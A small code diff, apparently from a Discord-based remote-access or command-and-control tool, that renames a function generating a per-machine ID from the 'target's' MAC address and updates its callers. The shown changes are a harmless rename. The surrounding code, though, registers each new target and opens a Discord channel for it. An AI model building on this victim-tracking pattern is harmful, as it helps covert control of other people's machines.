@@ -7,7 +7,7 @@ __DISCORD_CHANNELS_UUID_FILE = "info.json"
 
 
 # generate uuid using the target's mac address
-def __generate_uuid():
+def generate_uuid():
     return str(uuid.getnode())
 
 
@@ -18,7 +18,7 @@ def sanity():
     if os.path.exists(__DISCORD_CHANNELS_UUID_FILE):
         with open(__DISCORD_CHANNELS_UUID_FILE, "r") as setup:
             targets = json.load(setup).get("targets")
-            unique = __generate_uuid()
+            unique = generate_uuid()
 
             # target does not exists, create a text channel
             if unique not in targets:
@@ -26,7 +26,7 @@ def sanity():
     else:
         # generate new targets file and add the current target's mac uuid to it
         is_new_target = True
-        unique = __generate_uuid()
+        unique = generate_uuid()
         data = {
             "targets": [unique]
         }
